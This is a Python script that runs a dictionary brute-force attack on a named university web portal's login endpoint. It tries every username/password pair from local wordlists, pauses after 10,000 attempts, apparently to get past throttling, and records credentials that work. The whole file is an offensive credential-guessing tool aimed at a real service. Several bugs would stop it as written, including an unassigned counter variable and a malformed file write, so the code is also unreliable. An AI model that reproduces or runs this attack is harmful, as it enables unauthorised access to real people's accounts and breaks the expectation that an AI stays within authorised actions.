# coding=utf-8
import os
import time
import requests
import re
#import gevent
#from gevent import monkey; monkey.patch_socket()
from bs4 import BeautifulSoup as BS
#from Queue import Queue

step = 0
userkey = 'Login.Token1'
userv = 0
passkey = 'Login.Token2'
passv = 0
goto = 'http://my.scu.edu.cn/loginSuccess.portal'
gotoOnFail = 'http://my.scu.edu.cn/loginFailure.portal'

usr = []
pwd = []

def read_data(data_usr, data_pwd):

    for line in data_usr:
        usr.append(line[:-1])

    for line in data_pwd:
        pwd.append(line[:-1])

    return usr, pwd

def payloads(usr,pwd):
    payload = {}
    m = len(usr)
    n = len(pwd)
    
    for i in range(m):
        for j in range(n):
            payload = {userkey:usr[i], passkey:pwd[j], 'goto':goto, 'gotoOnFail':gotoOnFail}
            #print(payload)
            http(payload)

def http(payload):
    posturl = 'http://my.scu.edu.cn/userPasswordValidate.portal'
    step = step + 1
    if step == 10000:
        time.sleep(360)
        step = 0
    res = requests.post(posturl,data=payload)
    soup = BS(res.text, "lxml")
	#print soup
    result = re.compile('handleLoginSuccessed')
    t1 = soup.find(text=result) 
    if t1:
        print('Found!>>>' + payload[userkey], payload[passkey])
        f.write(payload[userkey], payload[passkey])
    else:
        print(payload[userkey], payload[passkey] + ' is not right...continue...')
        #f.write(payload[userkey] +' '+ payload[passkey] + '\n')
        
	#f.close()
    
def main():

	#q = Queue()
	#result = []
    '''
	f1 = open("F:\dict1.txt")
	f2 = open("F:\dict2.txt")
	f3 = open("F:\dict3.txt")
	f4 = open("F:\dict4.txt")
	f5 = open("F:\dict5.txt")

	gevent.joinall([
    gevent.spawn(payloads, f1),
    gevent.spawn(payloads, f2),
	gevent.spawn(payloads, f3),
    gevent.spawn(payloads, f4),
	gevent.spawn(payloads, f5),
])
'''
    global f
    f = open("result.txt",'a+')
    user = open("E:\\user.txt")
    pwad = open("F:\\dict.txt")
    usr, pwd = read_data(user,pwad)
    user.close()
    pwad.close()
    payloads(usr,pwd)
    f.close()
if __name__ == '__main__':
	print("begin at " + time.ctime())
	main()
	print("All finished. end at: " + time.ctime())
